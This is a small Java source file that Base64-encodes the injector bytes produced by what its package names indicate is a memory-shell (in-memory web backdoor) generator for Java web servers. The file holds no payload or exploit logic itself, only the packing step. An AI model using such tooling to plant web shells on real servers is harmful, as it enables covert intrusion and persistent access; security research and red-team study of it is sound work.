package com.reajason.javaweb.memshell.packer.base64;

import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.packer.Packer;
import org.apache.commons.codec.binary.Base64;

/**
 * @author ReaJason
 * @since 2024/12/17
 */
public class DefaultBase64Packer implements Packer {
    @Override
    public String pack(GenerateResult generateResult) {
        return Base64.encodeBase64String(generateResult.getInjectorBytes());
    }
}